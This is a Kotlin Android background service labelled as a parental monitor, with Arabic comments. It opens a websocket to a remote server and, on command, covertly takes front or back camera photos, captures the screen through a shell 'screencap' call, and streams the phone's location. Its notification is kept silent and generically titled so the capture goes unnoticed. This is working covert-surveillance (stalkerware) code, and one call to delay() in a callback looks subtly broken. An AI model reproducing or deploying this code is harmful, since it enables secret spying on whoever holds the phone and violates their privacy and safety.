package com.parental.monitor

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.ImageReader
import android.os.*
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.TimeUnit

class CoreService : Service() {
    companion object {
        private const val TAG = "CoreService"
        private const val NOTIF_ID = 1001
        private const val CHANNEL_ID = "ch_core"
        // ⚠️ غير هذه القيم بعد ما تشغل السيرفر ⚠️
        private const val SERVER_URL = "192.168.1.100:8080"
        private const val DEVICE_ID = "child_phone_01"
        private const val PARENT_ID = "parent_abc123"
    }

    private var ws: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .pingInterval(10, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS).build()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = false
    private var locationManager: LocationManager? = null
    private var cameraManager: CameraManager? = null

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(loc: Location) { sendLocation(loc.latitude, loc.longitude) }
        override fun onStatusChanged(p0: String?, p1: Int, p2: Bundle?) {}
        override fun onProviderEnabled(p0: String) {}
        override fun onProviderDisabled(p0: String) {}
    }

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "خدمات", NotificationManager.IMPORTANCE_MIN)
            ch.setShowBadge(false); ch.enableVibration(false); ch.setSound(null, null)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
        startForeground(NOTIF_ID, Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("خدمات الجهاز").setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true).setSilent(true).build())
        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        locationManager = getSystemService(LOCATION_SERVICE) as LocationManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning) { isRunning = true; connectToServer(); startLocationTracking() }
        return START_STICKY
    }

    private fun connectToServer() {
        scope.launch {
            while (true) {
                try {
                    val req = Request.Builder().url("ws://$SERVER_URL/ws/device/$DEVICE_ID").build()
                    ws = client.newWebSocket(req, object : WebSocketListener() {
                        override fun onOpen(ws: WebSocket, res: Response) {
                            Log.d(TAG, "✅ متصل بالخادم")
                            ws.send(JSONObject().apply {
                                put("type", "register")
                                put("device_id", DEVICE_ID)
                                put("parent_id", PARENT_ID)
                                put("device_model", Build.MODEL)
                                put("android_version", Build.VERSION.RELEASE)
                            }.toString())
                            startHeartbeat(ws)
                        }
                        override fun onMessage(ws: WebSocket, text: String) {
                            try {
                                val msg = JSONObject(text)
                                if (msg.getString("type") == "command")
                                    handleCommand(msg.getString("command"), msg.getJSONObject("params"))
                            } catch (_: Exception) {}
                        }
                        override fun onFailure(ws: WebSocket, t: Throwable, res: Response?) {
                            Log.e(TAG, "فشل الاتصال: ${t.message}")
                        }
                        override fun onClosed(ws: WebSocket, c: Int, r: String) {}
                    })
                    while (true) delay(10000)
                } catch (_: Exception) { delay(3000) }
            }
        }
    }

    private fun startHeartbeat(ws: WebSocket) {
        scope.launch {
            while (true) {
                try { ws.send(JSONObject().apply { put("type", "ping"); put("device_id", DEVICE_ID) }.toString()) } catch (_: Exception) {}
                delay(15000)
            }
        }
    }

    private fun startLocationTracking() {
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
            == PackageManager.PERMISSION_GRANTED) {
            try {
                locationManager?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 10f, locationListener)
                locationManager?.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000, 10f, locationListener)
                val loc = locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    ?: locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (loc != null) sendLocation(loc.latitude, loc.longitude)
            } catch (_: Exception) {}
        }
    }

    private fun sendLocation(lat: Double, lng: Double) {
        ws?.send(JSONObject().apply {
            put("type", "location"); put("device_id", DEVICE_ID)
            put("parent_id", PARENT_ID); put("lat", lat); put("lng", lng)
            put("timestamp", System.currentTimeMillis())
        }.toString())
    }

    private fun handleCommand(cmd: String, params: JSONObject) {
        when (cmd) {
            "capture_photo" -> capturePhoto("back")
            "capture_photo_front" -> capturePhoto("front")
            "get_location" -> {
                val loc = locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    ?: locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (loc != null) sendLocation(loc.latitude, loc.longitude)
            }
            "capture_screen" -> captureScreen()
        }
    }

    private fun capturePhoto(facing: String) {
        scope.launch {
            try {
                val targetFacing = if (facing == "front") CameraMetadata.LENS_FACING_FRONT else CameraMetadata.LENS_FACING_BACK
                var camId: String? = null
                cameraManager?.cameraIdList?.forEach { id ->
                    val chars = cameraManager?.getCameraCharacteristics(id)
                    if (chars?.get(CameraCharacteristics.LENS_FACING) == targetFacing) camId = id
                }
                if (camId == null) return@launch
                val reader = ImageReader.newInstance(1280, 720, android.graphics.ImageFormat.JPEG, 1)
                val handler = Handler(HandlerThread("cam").apply { start() }.looper)
                var imageBase64 = ""
                reader.setOnImageAvailableListener({ r ->
                    val img = r.acquireLatestImage()
                    if (img != null) {
                        val buffer = img.planes[0].buffer; val bytes = ByteArray(buffer.remaining()); buffer.get(bytes); img.close()
                        val bmp = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                        if (bmp != null) {
                            val bos = ByteArrayOutputStream()
                            bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, bos)
                            imageBase64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
                        }
                    }
                }, handler)
                cameraManager?.openCamera(camId!!, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        try {
                            camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(reader.surface); set(CaptureRequest.JPEG_QUALITY, 85.toByte())
                                        set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                    }
                                    session.capture(req.build(), null, handler); delay(500); session.close(); camera.close(); reader.close()
                                    if (imageBase64.isNotEmpty()) {
                                        ws?.send(JSONObject().apply {
                                            put("type", "camera_photo"); put("device_id", DEVICE_ID); put("parent_id", PARENT_ID)
                                            put("image", imageBase64); put("camera", facing); put("timestamp", System.currentTimeMillis())
                                        }.toString())
                                    }
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) {}
                            }, handler)
                        } catch (_: Exception) {}
                    }
                    override fun onDisconnected(c: CameraDevice) { c.close() }
                    override fun onError(c: CameraDevice, e: Int) { c.close() }
                }, handler)
            } catch (_: Exception) {}
        }
    }

    private fun captureScreen() {
        scope.launch {
            try {
                val file = File(cacheDir, ".sc_${System.currentTimeMillis()}.png")
                Runtime.getRuntime().exec(arrayOf("sh", "-c", "screencap -p ${file.absolutePath}")).waitFor()
                if (file.exists() && file.length() > 0) {
                    val bytes = file.readBytes()
                    val bmp = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    if (bmp != null) {
                        val bos = ByteArrayOutputStream()
                        bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 50, bos)
                        ws?.send(JSONObject().apply {
                            put("type", "screen_capture"); put("device_id", DEVICE_ID); put("parent_id", PARENT_ID)
                            put("image", Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP))
                            put("timestamp", System.currentTimeMillis())
                        }.toString())
                    }
                    file.delete()
                }
            } catch (_: Exception) {}
        }
    }

    override fun onBind(intent: Intent?) = null
}
